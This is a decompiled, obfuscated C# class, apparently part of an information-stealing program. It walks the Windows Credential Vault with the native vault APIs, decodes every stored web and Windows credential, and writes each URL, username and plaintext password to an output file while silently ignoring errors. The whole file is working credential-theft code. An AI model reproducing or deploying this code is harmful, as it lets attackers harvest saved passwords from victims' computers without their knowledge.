using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Moist;

// Token: 0x02000025 RID: 37
internal class Class10
{
	// Token: 0x060000BB RID: 187 RVA: 0x0000A944 File Offset: 0x00008B44
	public static void smethod_0(string string_0)
	{
		try
		{
			DesktopWriter.SetDirectory(string_0);
			Version version = Environment.OSVersion.Version;
			int major = version.Major;
			int minor = version.Minor;
			int num = 0;
			IntPtr zero = IntPtr.Zero;
			int num2 = Class11.VaultEnumerateVaults(0, ref num, ref zero);
			if (num2 != 0)
			{
				DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vaults. Error (0x" + num2.ToString() + ")", new object[0]));
			}
			IntPtr ptr = zero;
			Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>
			{
				{
					new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"),
					"Windows Secure Note"
				},
				{
					new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"),
					"Windows Web Password Credential"
				},
				{
					new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"),
					"Windows Credential Picker Protector"
				},
				{
					new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"),
					"Web Credentials"
				},
				{
					new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"),
					"Windows Credentials"
				},
				{
					new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"),
					"Windows Domain Certificate Credential"
				},
				{
					new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"),
					"Windows Domain Password Credential"
				},
				{
					new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"),
					"Windows Extended Credential"
				},
				{
					new Guid("00000000-0000-0000-0000-000000000000"),
					null
				}
			};
			for (int i = 0; i < num; i++)
			{
				object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
				Guid key = new Guid(obj.ToString());
				ptr = (IntPtr)(ptr.ToInt64() + (long)Marshal.SizeOf(typeof(Guid)));
				IntPtr zero2 = IntPtr.Zero;
				string str = dictionary.ContainsKey(key) ? dictionary[key] : key.ToString();
				num2 = Class11.VaultOpenVault(ref key, 0U, ref zero2);
				if (num2 != 0)
				{
					DesktopWriter.WriteLine(string.Format("Unable to open the following vault: " + str + ". Error: 0x" + num2.ToString(), new object[0]));
				}
				int num3 = 0;
				IntPtr zero3 = IntPtr.Zero;
				num2 = Class11.VaultEnumerateItems(zero2, 512, ref num3, ref zero3);
				if (num2 != 0)
				{
					DesktopWriter.WriteLine(string.Format("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num2.ToString(), new object[0]));
				}
				IntPtr ptr2 = zero3;
				if (num3 > 0)
				{
					for (int j = 1; j <= num3; j++)
					{
						Type type = (major < 6 || minor < 2) ? typeof(Class11.Struct6) : typeof(Class11.Struct5);
						object obj2 = Marshal.PtrToStructure(ptr2, type);
						ptr2 = (IntPtr)(ptr2.ToInt64() + (long)Marshal.SizeOf(type));
						IntPtr zero4 = IntPtr.Zero;
						FieldInfo field = obj2.GetType().GetField("SchemaId");
						Guid guid = new Guid(field.GetValue(obj2).ToString());
						FieldInfo field2 = obj2.GetType().GetField("pResourceElement");
						IntPtr intPtr = (IntPtr)field2.GetValue(obj2);
						FieldInfo field3 = obj2.GetType().GetField("pIdentityElement");
						IntPtr intPtr2 = (IntPtr)field3.GetValue(obj2);
						FieldInfo field4 = obj2.GetType().GetField("LastModified");
						ulong num4 = (ulong)field4.GetValue(obj2);
						IntPtr intPtr3 = IntPtr.Zero;
						if (major < 6 || minor < 2)
						{
							num2 = Class11.VaultGetItem_1(zero2, ref guid, intPtr, intPtr2, IntPtr.Zero, 0, ref zero4);
						}
						else
						{
							FieldInfo field5 = obj2.GetType().GetField("pPackageSid");
							intPtr3 = (IntPtr)field5.GetValue(obj2);
							num2 = Class11.VaultGetItem(zero2, ref guid, intPtr, intPtr2, intPtr3, IntPtr.Zero, 0, ref zero4);
						}
						if (num2 != 0)
						{
							DesktopWriter.WriteLine(string.Format("Error occured while retrieving vault item. Error: 0x" + num2.ToString(), new object[0]));
						}
						object obj3 = Marshal.PtrToStructure(zero4, type);
						FieldInfo field6 = obj3.GetType().GetField("pAuthenticatorElement");
						IntPtr intptr_ = (IntPtr)field6.GetValue(obj3);
						object obj4 = Class10.smethod_1(intptr_);
						object obj5 = null;
						if (intPtr3 != IntPtr.Zero)
						{
							obj5 = Class10.smethod_1(intPtr3);
						}
						if (obj4 != null)
						{
							object obj6 = Class10.smethod_1(intPtr);
							if (obj6 != null)
							{
								DesktopWriter.WriteLine(string.Format("Url: {0}", obj6));
							}
							object obj7 = Class10.smethod_1(intPtr2);
							if (obj7 != null)
							{
								DesktopWriter.WriteLine(string.Format("Username: {0}", obj7));
							}
							if (obj5 != null)
							{
								DesktopWriter.WriteLine(string.Format("PacakgeSid: {0}", obj5));
							}
							DesktopWriter.WriteLine(string.Format("Password: {0}\n\n", obj4));
							Class10.int_0++;
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x060000BC RID: 188 RVA: 0x0000446C File Offset: 0x0000266C
	public Class10()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x060000BD RID: 189 RVA: 0x0000AE08 File Offset: 0x00009008
	[CompilerGenerated]
	internal static object smethod_1(IntPtr intptr_0)
	{
		object obj = Marshal.PtrToStructure(intptr_0, typeof(Class11.Struct7));
		FieldInfo field = obj.GetType().GetField("Type");
		object value = field.GetValue(obj);
		IntPtr ptr = (IntPtr)(intptr_0.ToInt64() + 16L);
		switch ((int)value)
		{
		case 0:
		{
			object obj2 = Marshal.ReadByte(ptr);
			return (bool)obj2;
		}
		case 1:
			return Marshal.ReadInt16(ptr);
		case 2:
			return Marshal.ReadInt16(ptr);
		case 3:
			return Marshal.ReadInt32(ptr);
		case 4:
			return Marshal.ReadInt32(ptr);
		case 5:
			return Marshal.PtrToStructure(ptr, typeof(double));
		case 6:
			return Marshal.PtrToStructure(ptr, typeof(Guid));
		case 7:
		{
			IntPtr ptr2 = Marshal.ReadIntPtr(ptr);
			return Marshal.PtrToStringUni(ptr2);
		}
		case 12:
		{
			IntPtr binaryForm = Marshal.ReadIntPtr(ptr);
			SecurityIdentifier securityIdentifier = new SecurityIdentifier(binaryForm);
			return securityIdentifier.Value;
		}
		}
		return null;
	}

	// Token: 0x04000070 RID: 112
	public static int int_0;
}
